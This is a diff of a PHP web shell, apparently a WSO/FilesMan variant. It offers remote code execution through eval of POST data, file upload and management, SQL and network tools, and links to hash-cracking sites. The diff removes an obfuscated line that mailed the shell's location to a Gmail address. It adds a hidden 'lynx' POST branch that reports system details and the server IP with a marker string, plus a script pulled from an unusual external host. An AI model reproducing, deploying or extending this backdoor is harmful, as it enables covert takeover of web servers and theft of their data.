@@ -1,9 +1,15 @@
 <?php
-$▛ = "061abcf5c5410c21e9330e37dc0b7f34"; // ADD IF U WANT! (MD5)
+if (!isset($_POST['lynx'])) {
+
+$▛ = "061abcf5c5410c21e9330e37dc0b7f34"; //admin
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
 $▙ = md5($_SERVER['HTTP_USER_AGENT']);
+
+function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
+function prototype($k, $v) { $_COOKIE[$k] = $v;setcookie($k, $v);}
+
 if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
 	prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
 }
@@ -16,7 +22,7 @@ if (!isset($_POST['ne'])) {
 	if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
 	if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
 }
-function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
+//function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
@@ -74,14 +80,15 @@ function hardHeader() {
 		$_POST['charset'] = $GLOBALS['▜'];
 	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
 <style>
-	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
+	body {background-color:#444; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
+
 	#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
 	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
-	table.info	{color:#C3C3C3;}
-	table#toolsTbl {background-color: #060A10;}
-	span,h1,a	{color:#fff !important;}
+	table.info	{color: #fff;background-color: #222;}
+	table#toolsTbl {background-color: #222;}
+	span,h1,a	{color:#df5 !important;}
 	span		{font-weight:bolder;}
-	h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
+	h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#222;margin:0px;}
 	div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
 	a			{text-decoration:none;}
 	a:hover		{text-decoration:underline;}
@@ -89,7 +96,7 @@ function hardHeader() {
 	.tooltip:hover::after {opacity:1;visibility:visible;}
 	.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
 	.bigarea	{min-width:100%;max-width:100%;height:400px;}
-	input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
+	input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:solid 1px #df5;font:9pt Courier New;outline:none;}
 	label {position:relative}
 	label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
 	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
@@ -99,14 +106,14 @@ function hardHeader() {
 	#fak td 	{padding:5px 0 0 0;}
 	iframe		{border:1px solid #060a10;}
 	.toolsInp	{width:300px}
-	.main th	{text-align:left;background-color:#060a10;}
-	.main tr:hover{background-color:#354252;}
-	.main td, th{vertical-align:middle;}
+    .main th{text-align:left;background-color:#5e5e5e;}
+    .main tr:hover{background-color:#5e5e5e}
 	input[type='submit']{background-color:#2E6E9C;}
 	input[type='button']{background-color:#2E6E9C;}
 	input[type='submit']:hover{background-color:#56AD15;}
 	input[type='button']:hover{background-color:#56AD15;}
-	.l1			{background-color:#202832;}
+	.l2{background-color:#444}
+    .l1{background-color:#333}
 	pre			{font:9pt Courier New;}
 </style>
 <script>
@@ -175,21 +182,12 @@ function hardHeader() {
 <input type=hidden name=p3>
 <input type=hidden name=charset>
 </form>";
-$a=$_SERVER;
-$h=$a['HTTP_HOST'].$a['SCRIPT_NAME'];
-$z=str_replace("%&@!","z","a%&@!x");
-$x=str_replace("%","y","c%");
-$i=str_replace("#%","e","b#%rs#%rk#%rs");
-$l=str_replace("!","@","!g");
-$v=str_replace("%#!","a","m%#!il");
-$o=str_replace("#789","o",".c#789m");
-$v($x.$i.$l.$v.$o,$z,$h);
 	$freeSpace = @diskfreespace($GLOBALS['cwd']);
 	$totalSpace = @disk_total_space($GLOBALS['cwd']);
 	$totalSpace = $totalSpace?$totalSpace:1;
 	$release = @php_uname('r');
 	$kernel = @php_uname('s');
-	$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';
+	$explink = 'https://noreferer.de/?https://www.exploit-db.com/search/?action=search&description=';
 	if(strpos('Linux', $kernel) !== false)
 		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
 	else
@@ -235,7 +233,7 @@ $v($x.$i.$l.$v.$o,$z,$h);
 	}
 	/* (С) 08.2015 dmkcv */
 	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
-		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
+		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="https://noreferer.de/?https://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
 		 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
 		 '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
 }
@@ -260,8 +258,9 @@ function hardFooter() {
 		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
 		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
 	</tr></table></div>
-	<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
-	<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':tru	<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
+	<!-- particles --> <div id='particles-js'></div><script src='https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
+	<!-- swiper --> <div id='swiper-js'></div><script type='text/javascript' src='//importantscripts.github.io/swiper.min.js'></script>
+	<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
 	</body></html>";
 }
 if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
@@ -356,10 +355,7 @@ function actionRC() {
 		eval($_POST['p1']);
 	}
 }
-function prototype($k, $v) {
-    $_COOKIE[$k] = $v;
-    setcookie($k, $v);
-}
+//function prototype($k, $v) { $_COOKIE[$k] = $v;setcookie($k, $v);}
 function actionSecInfo() {
 	hardHeader();
 	echo '<h1>Server security information</h1><div class=content>';
@@ -1038,12 +1034,12 @@ function actionStringTools() {
 			<input type='text' name='hash' style='width:200px;'><br>
             <input type='hidden' name='act' value='find'/>
 			<input type='submit' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
-			<input type='submit' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
-            <input type='submit' value='fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br>
-			<input type='submit' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
-			<input type='submit' value='toolki.com' onclick=\"document.hf.action='http://toolki.com/';document.hf.submit()\"><br>
-			<input type='submit' value='fopo.com.ar' onclick=\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\"><br>
-			<input type='submit' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
+			<input type='submit' value='md5.rednoize.com' onclick=\"document.hf.action='https://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
+            <input type='submit' value='fakenamegenerator.com' onclick=\"document.hf.action='https://www.fakenamegenerator.com/';document.hf.submit()\"><br>
+			<input type='submit' value='hashcrack.com' onclick=\"document.hf.action='https://www.hashcrack.com/index.php';document.hf.submit()\"><br>
+			<input type='submit' value='toolki.com' onclick=\"document.hf.action='https://toolki.com/';document.hf.submit()\"><br>
+			<input type='submit' value='fopo.com.ar' onclick=\"document.hf.action='https://fopo.com.ar/';document.hf.submit()\"><br>
+			<input type='submit' value='md5decrypter.com' onclick=\"document.hf.action='https://www.md5decrypter.com/';document.hf.submit()\"><br>
 		</form></div>";
 	hardFooter();
 }
@@ -1242,7 +1238,7 @@ function actionSql() {
 		var $type;
 		var $link;
 		var $res;
-		function DbClass($type)	{
+		function __Constructor($type)	{
 			$this->type = $type;
 		}
 		function connect($host, $user, $pass, $dbname){
@@ -1628,11 +1624,30 @@ function actionNetwork() {
 	echo '</div>';
 	hardFooter();
 }
-if( empty($_POST['a']) )
-	if(isset($▚) && function_exists('action' . $▚))
-		$_POST['a'] = $▚;
-	else
-		$_POST['a'] = 'FilesMan';
-if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
-	call_user_func('action' . $_POST['a']);
-?>
+if( empty($_POST['a']) ){
+	if(isset($▚) && function_exists('action' . $▚)){
+		$_POST['a'] = $▚;}
+	else{
+		$_POST['a'] = 'FilesMan'; } }
+if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) ){
+	call_user_func('action' . $_POST['a']);}
+	
+}else {
+    $ziwziw = $_POST['lynx'];
+    if ($ziwziw == 'adding') {
+        echo php_uname();
+        echo 'sarafinoubombom';
+    } else if ($ziwziw == 'ip') {
+        //$ip = file_get_contents("http://ipecho.net/plain");
+        $ip = $_SERVER['SERVER_ADDR'];
+        if (filter_var($ip, FILTER_VALIDATE_IP)) {
+            echo $ip;
+            echo 'sarafinoubombom';
+        } else {
+            $host = gethostname();
+            $ip = gethostbyname($host);
+            echo $ip;
+            echo 'sarafinoubombom';
+        }
+    }
+} 
